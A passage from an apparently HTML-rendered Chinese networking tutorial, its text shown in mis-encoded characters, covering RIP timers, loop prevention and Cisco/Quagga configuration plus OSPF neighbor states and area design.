EIGRPè€ƒè™‘<br><br><span class="hljs-bullet">6.</span> MTUï¼ˆæœ€å¤§ä¼ è¾“å•å…ƒï¼‰<br><span class="hljs-bullet">   -</span> EIGRPè€ƒè™‘<br><br>å¤åˆåº¦é‡ï¼š<br>EIGRPåº¦é‡ = [K1Ã—å¸¦å®½ + (K2Ã—å¸¦å®½)/(256-è´Ÿè½½) + K3Ã—å»¶è¿Ÿ] Ã— [K5/(å¯é æ€§+K4)]<br><br>é»˜è®¤ï¼šK1=K3=1, K2=K4=K5=0<br>ç®€åŒ–ä¸ºï¼šåº¦é‡ = å¸¦å®½ + å»¶è¿Ÿ<br></code></pre></td></tr></table></figure><hr><h2 id="5-RIPåè®®è¯¦è§£"><a href="#5-RIPåè®®è¯¦è§£" class="headerlink" title="5. RIPåè®®è¯¦è§£"></a>5. RIPåè®®è¯¦è§£</h2><h3 id="5-1-RIPæ¦‚è¿°"><a href="#5-1-RIPæ¦‚è¿°" class="headerlink" title="5.1 RIPæ¦‚è¿°"></a>5.1 RIPæ¦‚è¿°</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">RIP = Routing Information Protocol<br>è·¯ç”±ä¿¡æ¯åè®®<br><br>ç‰ˆæœ¬ï¼š<br><span class="hljs-bullet">- </span>RIP v1ï¼ˆ1988ï¼‰ï¼šæœ‰ç±»è·¯ç”±ï¼Œä¸æ”¯æŒVLSM<br><span class="hljs-bullet">- </span>RIP v2ï¼ˆ1993ï¼‰ï¼šæ— ç±»è·¯ç”±ï¼Œæ”¯æŒVLSMï¼Œæ”¯æŒè®¤è¯<br><span class="hljs-bullet">- </span>RIPngï¼šIPv6ç‰ˆæœ¬<br><br>ç‰¹ç‚¹ï¼š<br><span class="hljs-bullet">- </span>è·ç¦»çŸ¢é‡åè®®<br><span class="hljs-bullet">- </span>åº¦é‡ï¼šè·³æ•°<br><span class="hljs-bullet">- </span>æœ€å¤§è·³æ•°ï¼š15ï¼ˆ16è¡¨ç¤ºä¸å¯è¾¾ï¼‰<br><span class="hljs-bullet">- </span>æ›´æ–°å‘¨æœŸï¼š30ç§’<br><span class="hljs-bullet">- </span>å¤±æ•ˆæ—¶é—´ï¼š180ç§’<br><span class="hljs-bullet">- </span>åˆ·æ–°æ—¶é—´ï¼š240ç§’<br><span class="hljs-bullet">- </span>ç«¯å£ï¼šUDP 520<br><span class="hljs-bullet">- </span>ç®¡ç†è·ç¦»ï¼š120<br><br>é€‚ç”¨åœºæ™¯ï¼š<br>âœ… å°å‹ç½‘ç»œ<br>âœ… ç®€å•æ‹“æ‰‘<br>âœ… å…¼å®¹æ€§è¦æ±‚é«˜<br>âœ… è®¾å¤‡æ€§èƒ½æœ‰é™<br><br>ä¸é€‚ç”¨åœºæ™¯ï¼š<br>âŒ å¤§å‹ç½‘ç»œï¼ˆ&gt;15è·³ï¼‰<br>âŒ éœ€è¦å¿«é€Ÿæ”¶æ•›<br>âŒ å¤æ‚æ‹“æ‰‘<br>âŒ éœ€è¦ç²¾ç¡®æ§åˆ¶<br></code></pre></td></tr></table></figure><h3 id="5-2-RIPå·¥ä½œåŸç†"><a href="#5-2-RIPå·¥ä½œåŸç†" class="headerlink" title="5.2 RIPå·¥ä½œåŸç†"></a>5.2 RIPå·¥ä½œåŸç†</h3><p><strong>è·¯ç”±æ›´æ–°</strong>ï¼š</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">RIPæ›´æ–°æœºåˆ¶ï¼š<br><br><span class="hljs-number">1</span>. å®šæœŸæ›´æ–°ï¼ˆæ¯<span class="hljs-number">30</span>ç§’ï¼‰<br>   - è·¯ç”±å™¨å¹¿æ’­æ•´ä¸ªè·¯ç”±è¡¨<br>   - åœ°å€ï¼š<br>     * RIPv1: <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>ï¼ˆå¹¿æ’­ï¼‰<br>     * RIPv2: <span class="hljs-number">224</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">9</span>ï¼ˆç»„æ’­ï¼‰<br><br><span class="hljs-number">2</span>. è§¦å‘æ›´æ–°<br>   - è·¯ç”±å˜åŒ–æ—¶ç«‹å³å‘é€<br>   - é˜²æ­¢è·¯ç”±ç¯è·¯<br><br><span class="hljs-number">3</span>. é‚»å±…å‘ç°<br>   - é€šè¿‡æ¥æ”¶æ›´æ–°å‘ç°é‚»å±…<br>   - æ²¡æœ‰Helloæœºåˆ¶<br><br>è·¯ç”±è¡¨é¡¹åŒ…å«ï¼š<br>- ç›®æ ‡ç½‘ç»œ<br>- åº¦é‡ï¼ˆè·³æ•°ï¼‰<br>- ä¸‹ä¸€è·³<br>- è¶…æ—¶å®šæ—¶å™¨<br><br>ç¤ºä¾‹ï¼š<br><br>è·¯ç”±å™¨R1è¿æ¥ï¼š<br>- ç½‘ç»œA: <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span>ï¼ˆç›´è¿ï¼Œåº¦é‡<span class="hljs-number">0</span>ï¼‰<br>- ç½‘ç»œB: <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span>ï¼ˆç›´è¿ï¼Œåº¦é‡<span class="hljs-number">0</span>ï¼‰<br><br>R1å¹¿æ’­æ›´æ–°ç»™é‚»å±…R2ï¼š<br>Network         Metric<br><span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span>    <span class="hljs-number">1</span>      (åº¦é‡+<span class="hljs-number">1</span>)<br><span class="hljs-number">192.168.2.0</span>/<span class="hljs-number">24</span>    <span class="hljs-number">1</span>      (åº¦é‡+<span class="hljs-number">1</span>)<br><br>R2æ¥æ”¶å¹¶æ›´æ–°è·¯ç”±è¡¨ï¼š<br>Network         Next Hop    Metric<br><span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span>  R1          <span class="hljs-number">1</span><br><span class="hljs-number">192.168.2.0</span>/<span class="hljs-number">24</span>  R1          <span class="hljs-number">1</span><br><span class="hljs-number">192.168.3.0</span>/<span class="hljs-number">24</span>  ç›´è¿        <span class="hljs-number">0</span><br><br>R2å†å¹¿æ’­ç»™R3...<br></code></pre></td></tr></table></figure><p><strong>é˜²ç¯æœºåˆ¶</strong>ï¼š</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">RIPé˜²ç¯æœºåˆ¶ï¼š<br><br>é—®é¢˜ï¼šè·ç¦»çŸ¢é‡åè®®å®¹æ˜“äº§ç”Ÿè·¯ç”±ç¯è·¯<br><br>ç¤ºä¾‹ï¼š<br><span class="hljs-built_in">R1</span> â† â†’ <span class="hljs-built_in">R2</span> â† â†’ <span class="hljs-built_in">R3</span><br> â†“<br>ç½‘ç»œA<br><br>æ­£å¸¸æƒ…å†µï¼š<br><span class="hljs-symbol">R1:</span> ç½‘ç»œA, åº¦é‡<span class="hljs-number">0</span>ï¼ˆç›´è¿ï¼‰<br><span class="hljs-symbol">R2:</span> ç½‘ç»œA via <span class="hljs-built_in">R1</span>, åº¦é‡<span class="hljs-number">1</span><br><span class="hljs-symbol">R3:</span> ç½‘ç»œA via <span class="hljs-built_in">R2</span>, åº¦é‡<span class="hljs-number">2</span><br><br><span class="hljs-built_in">R1</span>-ç½‘ç»œAé“¾è·¯æ–­å¼€ï¼š<br><span class="hljs-symbol">R1:</span> ç½‘ç»œAä¸å¯è¾¾<br><span class="hljs-symbol">R2:</span> è¿˜è®°å½•ç€ç½‘ç»œA via <span class="hljs-built_in">R1</span>, åº¦é‡<span class="hljs-number">1</span>ï¼ˆæœªæ›´æ–°ï¼‰<br><span class="hljs-built_in">R1</span>æ”¶åˆ°<span class="hljs-built_in">R2</span>çš„æ›´æ–°ï¼šè®¤ä¸ºå¯ä»¥é€šè¿‡<span class="hljs-built_in">R2</span>åˆ°è¾¾ç½‘ç»œA, åº¦é‡<span class="hljs-number">2</span><br><span class="hljs-built_in">R2</span>æ”¶åˆ°<span class="hljs-built_in">R1</span>çš„æ›´æ–°ï¼šæ›´æ–°ä¸ºåº¦é‡<span class="hljs-number">3</span><br>...æ— é™è®¡æ•°ï¼<br><br>é˜²ç¯æœºåˆ¶ï¼š<br><br><span class="hljs-number">1.</span> æœ€å¤§è·³æ•°ï¼ˆMaximum Hop Countï¼‰<br>   - <span class="hljs-number">16</span>è¡¨ç¤ºä¸å¯è¾¾<br>   - é™åˆ¶æ— é™è®¡æ•°<br>   - ä½†é™åˆ¶äº†ç½‘ç»œè§„æ¨¡<br><br><span class="hljs-number">2.</span> æ°´å¹³åˆ†å‰²ï¼ˆSplit Horizonï¼‰<br>   - ä¸å‘æ¥æ”¶è·¯ç”±çš„æ¥å£å‘å›è¯¥è·¯ç”±<br>   - ç¤ºä¾‹ï¼š<br>     <span class="hljs-built_in">R1</span>ä»<span class="hljs-built_in">R2</span>å­¦åˆ°ç½‘ç»œA<br>     <span class="hljs-built_in">R1</span>ä¸ä¼šå‘<span class="hljs-built_in">R2</span>é€šå‘Šç½‘ç»œA<br><br><span class="hljs-number">3.</span> æ¯’æ€§é€†è½¬ï¼ˆPoison Reverseï¼‰<br>   - å‘æºæ¥å£é€šå‘Šä¸å¯è¾¾ï¼ˆåº¦é‡<span class="hljs-number">16</span>ï¼‰<br>   - æ¯”æ°´å¹³åˆ†å‰²æ›´ç§¯æ<br>   - ç¤ºä¾‹ï¼š<br>     <span class="hljs-built_in">R1</span>ä»<span class="hljs-built_in">R2</span>å­¦åˆ°ç½‘ç»œA<br>     <span class="hljs-built_in">R1</span>å‘<span class="hljs-built_in">R2</span>é€šå‘Šï¼šç½‘ç»œAåº¦é‡<span class="hljs-number">16</span>ï¼ˆä¸å¯è¾¾ï¼‰<br><br><span class="hljs-number">4.</span> æŠ‘åˆ¶å®šæ—¶å™¨ï¼ˆHolddown Timerï¼‰<br>   - è·¯ç”±å¤±æ•ˆåï¼Œåœ¨ä¸€å®šæ—¶é—´å†…ä¸æ¥å—æ›´æ–°<br>   - é˜²æ­¢é”™è¯¯è·¯ç”±ä¿¡æ¯<br>   - å…¸å‹ï¼š<span class="hljs-number">180</span>ç§’<br><br><span class="hljs-number">5.</span> è§¦å‘æ›´æ–°ï¼ˆTriggered Updateï¼‰<br>   - è·¯ç”±å˜åŒ–ç«‹å³å‘é€<br>   - åŠ å¿«æ”¶æ•›<br></code></pre></td></tr></table></figure><h3 id="5-3-RIPé…ç½®ç¤ºä¾‹"><a href="#5-3-RIPé…ç½®ç¤ºä¾‹" class="headerlink" title="5.3 RIPé…ç½®ç¤ºä¾‹"></a>5.3 RIPé…ç½®ç¤ºä¾‹</h3><p><strong>Ciscoè·¯ç”±å™¨</strong>ï¼š</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment"># å¯ç”¨RIP</span><br>Router(<span class="hljs-built_in">config</span>)<span class="hljs-comment"># router rip</span><br><br><span class="hljs-comment"># æŒ‡å®šç‰ˆæœ¬</span><br>Router(<span class="hljs-built_in">config</span>-router)<span class="hljs-comment"># version 2</span><br><br><span class="hljs-comment"># é€šå‘Šç½‘ç»œï¼ˆæœ‰ç±»ç½‘ç»œï¼‰</span><br>Router(<span class="hljs-built_in">config</span>-router)<span class="hljs-comment"># network 192.168.1.0</span><br>Router(<span class="hljs-built_in">config</span>-router)<span class="hljs-comment"># network 192.168.2.0</span><br><br><span class="hljs-comment"># å…³é—­è‡ªåŠ¨æ±‡æ€»ï¼ˆRIPv2ï¼‰</span><br>Router(<span class="hljs-built_in">config</span>-router)<span class="hljs-comment"># no auto-summary</span><br><br><span class="hljs-comment"># é…ç½®è¢«åŠ¨æ¥å£ï¼ˆä¸å‘é€æ›´æ–°ï¼‰</span><br>Router(<span class="hljs-built_in">config</span>-router)<span class="hljs-comment"># passive-interface GigabitEthernet0/0</span><br><br><span class="hljs-comment"># é…ç½®é»˜è®¤è·¯ç”±ä¼ æ’­</span><br>Router(<span class="hljs-built_in">config</span>-router)<span class="hljs-comment"># default-information originate</span><br><br><span class="hljs-comment"># æŸ¥çœ‹RIPé…ç½®</span><br>Router<span class="hljs-comment"># show ip protocols</span><br><br><span class="hljs-comment"># æŸ¥çœ‹RIPæ•°æ®åº“</span><br>Router<span class="hljs-comment"># show ip rip database</span><br><br><span class="hljs-comment"># è°ƒè¯•RIP</span><br>Router<span class="hljs-comment"># debug ip rip</span><br></code></pre></td></tr></table></figure><p><strong>Linuxï¼ˆQuagga&#x2F;FRRoutingï¼‰</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># å®‰è£…Quagga</span><br><span class="hljs-built_in">sudo</span> apt-get install quagga<br><br><span class="hljs-comment"># é…ç½®RIP</span><br><span class="hljs-built_in">sudo</span> vtysh<br>configure terminal<br>router rip<br>  version 2<br>  network 192.168.1.0/24<br>  network 192.168.2.0/24<br>  <span class="hljs-built_in">exit</span><br><span class="hljs-built_in">exit</span><br>write memory<br></code></pre></td></tr></table></figure><hr><h2 id="6-OSPFåè®®åŸºç¡€"><a href="#6-OSPFåè®®åŸºç¡€" class="headerlink" title="6. OSPFåè®®åŸºç¡€"></a>6. OSPFåè®®åŸºç¡€</h2><h3 id="6-1-OSPFæ¦‚è¿°"><a href="#6-1-OSPFæ¦‚è¿°" class="headerlink" title="6.1 OSPFæ¦‚è¿°"></a>6.1 OSPFæ¦‚è¿°</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">OSPF = Open Shortest Path First<br>å¼€æ”¾æœ€çŸ­è·¯å¾„ä¼˜å…ˆ<br><br>ç‰¹ç‚¹ï¼š<br><span class="hljs-bullet">- </span>é“¾è·¯çŠ¶æ€åè®®<br><span class="hljs-bullet">- </span>åŸºäºDijkstraç®—æ³•ï¼ˆSPFï¼‰<br><span class="hljs-bullet">- </span>åº¦é‡ï¼šCostï¼ˆåŸºäºå¸¦å®½ï¼‰<br><span class="hljs-bullet">- </span>æ”¯æŒVLSMå’ŒCIDR<br><span class="hljs-bullet">- </span>å¿«é€Ÿæ”¶æ•›<br><span class="hljs-bullet">- </span>åˆ†å±‚è®¾è®¡ï¼ˆåŒºåŸŸï¼‰<br><span class="hljs-bullet">- </span>æ”¯æŒè®¤è¯<br><span class="hljs-bullet">- </span>åè®®ï¼šIPåè®®89<br><span class="hljs-bullet">- </span>ç®¡ç†è·ç¦»ï¼š110<br><br>ç‰ˆæœ¬ï¼š<br><span class="hljs-bullet">- </span>OSPFv2ï¼šIPv4<br><span class="hljs-bullet">- </span>OSPFv3ï¼šIPv6<br><br>ä¼˜ç‚¹ï¼š<br>âœ… å¿«é€Ÿæ”¶æ•›<br>âœ… æ— ç¯è·¯<br>âœ… æ”¯æŒå¤§å‹ç½‘ç»œ<br>âœ… ç²¾ç¡®åº¦é‡ï¼ˆå¸¦å®½ï¼‰<br>âœ… åˆ†å±‚è®¾è®¡<br>âœ… è´Ÿè½½å‡è¡¡<br><br>ç¼ºç‚¹ï¼š<br>âŒ é…ç½®å¤æ‚<br>âŒ å ç”¨CPUå’Œå†…å­˜<br>âŒ éœ€è¦è§„åˆ’åŒºåŸŸ<br></code></pre></td></tr></table></figure><h3 id="6-2-OSPFå·¥ä½œåŸç†"><a href="#6-2-OSPFå·¥ä½œåŸç†" class="headerlink" title="6.2 OSPFå·¥ä½œåŸç†"></a>6.2 OSPFå·¥ä½œåŸç†</h3><p><strong>é‚»å±…å…³ç³»</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs markdown">OSPFé‚»å±…å»ºç«‹è¿‡ç¨‹ï¼š<br><br><span class="hljs-bullet">1.</span> DownçŠ¶æ€<br><span class="hljs-bullet">   -</span> åˆå§‹çŠ¶æ€<br><span class="hljs-bullet">   -</span> æœªå‘é€Hello<br><br><span class="hljs-bullet">2.</span> InitçŠ¶æ€<br><span class="hljs-bullet">   -</span> å‘é€HelloåŒ…<br><span class="hljs-bullet">   -</span> å°šæœªæ”¶åˆ°é‚»å±…çš„Hello<br><br><span class="hljs-bullet">3.</span> 2-WayçŠ¶æ€<br><span class="hljs-bullet">   -</span> æ”¶åˆ°å¯¹æ–¹Hello<br><span class="hljs-bullet">   -</span> çœ‹åˆ°è‡ªå·±çš„Router ID<br><span class="hljs-bullet">   -</span> é‚»å±…å…³ç³»å»ºç«‹<br><span class="hljs-bullet">   -</span> é€‰ä¸¾DR/BDRï¼ˆå¦‚æœåœ¨å¤šè·¯è®¿é—®ç½‘ç»œï¼‰<br><br><span class="hljs-bullet">4.</span> ExStartçŠ¶æ€<br><span class="hljs-bullet">   -</span> å†³å®šä¸»ä»å…³ç³»<br><span class="hljs-bullet">   -</span> Router IDå¤§çš„ä¸ºä¸»<br><br><span class="hljs-bullet">5.</span> ExchangeçŠ¶æ€<br><span class="hljs-bullet">   -</span> äº¤æ¢æ•°æ®åº“æè¿°ï¼ˆDBDï¼‰<br><span class="hljs-bullet">   -</span> æè¿°é“¾è·¯çŠ¶æ€æ•°æ®åº“<br><br><span class="hljs-bullet">6.</span> LoadingçŠ¶æ€<br><span class="hljs-bullet">   -</span> è¯·æ±‚å®Œæ•´LSA<br><span class="hljs-bullet">   -</span> å‘é€LSRï¼ˆé“¾è·¯çŠ¶æ€è¯·æ±‚ï¼‰<br><span class="hljs-bullet">   -</span> æ¥æ”¶LSUï¼ˆé“¾è·¯çŠ¶æ€æ›´æ–°ï¼‰<br><br><span class="hljs-bullet">7.</span> FullçŠ¶æ€<br><span class="hljs-bullet">   -</span> æ•°æ®åº“åŒæ­¥å®Œæˆ<br><span class="hljs-bullet">   -</span> é‚»æ¥å…³ç³»å»ºç«‹<br><span class="hljs-bullet">   -</span> å¯ä»¥è½¬å‘æµé‡<br><br>HelloåŒ…å†…å®¹ï¼š<br><span class="hljs-bullet">-</span> Router ID<br><span class="hljs-bullet">-</span> Area ID<br><span class="hljs-bullet">-</span> è®¤è¯ä¿¡æ¯<br><span class="hljs-bullet">-</span> Helloé—´éš”<br><span class="hljs-bullet">-</span> Deadé—´éš”<br><span class="hljs-bullet">-</span> ä¼˜å…ˆçº§<br><span class="hljs-bullet">-</span> DRå’ŒBDR<br><span class="hljs-bullet">-</span> é‚»å±…åˆ—è¡¨<br><br>Helloé—´éš”ï¼š<br><span class="hljs-bullet">-</span> é»˜è®¤10ç§’ï¼ˆç‚¹å¯¹ç‚¹ã€å¹¿æ’­ï¼‰<br><span class="hljs-bullet">-</span> 30ç§’ï¼ˆNBMAï¼‰<br><br>Deadé—´éš”ï¼š<br><span class="hljs-bullet">-</span> é»˜è®¤40ç§’ï¼ˆ4å€Helloï¼‰<br></code></pre></td></tr></table></figure><p><strong>åŒºåŸŸæ¦‚å¿µ</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs markdown">OSPFåŒºåŸŸè®¾è®¡ï¼š<br><br>ä¸ºä»€ä¹ˆéœ€è¦åŒºåŸŸï¼Ÿ<br><span class="hljs-bullet">-</span> å‡å°‘LSAæ³›æ´ª<br><span class="hljs-bullet">-</span> å‡å°è·¯ç”±è¡¨<br><span class="hljs-bullet">-</span> åŠ å¿«æ”¶æ•›<br><span class="hljs-bullet">-</span> éš”ç¦»æ•…éšœ<br><br>åŒºåŸŸç±»å‹ï¼š<br><br><span class="hljs-bullet">1.</span> éª¨å¹²åŒºåŸŸï¼ˆArea 0ï¼‰<br><span class="hljs-bullet">   -</span> æ‰€æœ‰åŒºåŸŸå¿…é¡»è¿æ¥åˆ°Area 0<br><span class="hljs-bullet">   -</span> æ ¸å¿ƒåŒºåŸŸ<br><span class="hljs-bullet">   -</span> ä¸èƒ½åˆ†å‰²<br><br><span class="hljs-bullet">2.</span> å¸¸è§„åŒºåŸŸï¼ˆRegular Areaï¼‰<br><span class="hljs-bullet">   -</span> æ ‡å‡†OSPFåŒºåŸŸ<br><span class="hljs-bullet">   -</span> æ¥æ”¶æ‰€æœ‰LSAç±»å‹<br><br><span class="hljs-bullet">3.</span> æœ«ç«¯åŒºåŸŸï¼ˆStub Areaï¼‰<br><span class="hljs-bullet">   -</span> ä¸æ¥æ”¶å¤–éƒ¨LSAï¼ˆType 5ï¼‰<br><span class="hljs-bullet">   -</span> ä½¿ç”¨é»˜è®¤è·¯ç”±<br><span class="hljs-bullet">   -</span> å‡å°‘è·¯ç”±è¡¨<br><br><span class="hljs-bullet">4.</span> å®Œå…¨æœ«ç«¯åŒºåŸŸï¼ˆTotally Stub Areaï¼‰<br><span class="hljs-bullet">   -</span> åªæœ‰é»˜è®¤è·¯ç”±å’ŒåŒºåŸŸå†…è·¯ç”±<br><span class="hljs-bullet">   -</span> Ciscoä¸“æœ‰<br><br><span class="hljs-bullet">5.</span> NSSAï¼ˆNot-So-Stubby Areaï¼‰<br><span class="hljs-bullet">   -</span> ç±»ä¼¼Stubï¼Œä½†å…è®¸æ³¨å…¥å¤–éƒ¨è·¯ç”±ï¼ˆType 7ï¼‰<br><br>æ‹“æ‰‘ç¤ºä¾‹ï¼š<br><span class="hljs-code">         â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span><br><span class="hljs-code">         â”‚   Area 0     â”‚</span><br><span class="hljs-code">         â”‚   (éª¨å¹²)     â”‚</span><br><span class="hljs-code">         â””â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”˜</span><br><span class="hljs-code">             â”‚      â”‚</span><br><span class="hljs-code">      â”Œâ”€â”€â”€â”€â”€â”€â”´â”€â”€â” â”Œâ”€â”´â”€â”€â”€â”€â”€â”€â”</span><br><span class="hljs-code">      â”‚ Area 1  â”‚ â”‚ Area 2 â”‚</span><br><span class="hljs-code">      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span><br><span class="hljs-code"></span><br>è·¯ç”±å™¨ç±»å‹ï¼š<br><span class="hljs-bullet">-</span> å†…éƒ¨è·¯ç”±å™¨ï¼ˆIRï¼‰ï¼šæ‰€æœ‰æ¥å£åœ¨åŒä¸€åŒºåŸŸ<br><span class="hljs-bullet">-</span> éª¨å¹²è·¯ç”±å™¨ï¼ˆBRï¼‰ï¼šè‡³å°‘ä¸€ä¸ªæ¥å£åœ¨Area 0<br><span class="hljs-bullet">-</span> åŒºåŸŸè¾¹ç•Œè·¯ç”±å™¨ï¼ˆABRï¼‰ï¼šè¿æ¥å¤šä¸ªåŒºåŸŸ<br><span class="hljs-bullet">-</span> è‡ªæ²»ç³»ç»Ÿè¾¹ç•Œè·¯ç”±å™¨ï¼ˆASBRï¼‰ï¼šè¿æ¥å…¶ä»–AS<br></code></pre></td></tr></table></figure><h3 id="6-3-OSPFé…ç½®ç¤ºä¾‹"><a href="#6-3-OSPFé…ç½®ç¤ºä¾‹" class="headerlink" title="6.3 OSPFé…ç½®ç¤ºä¾‹"></a>6.3 OSPFé…ç½®ç¤ºä¾‹</h3><p><strong>Ciscoè·¯ç”±å™¨</strong>ï¼š</p><figure class="highlight mipsasm"><table><tr><td 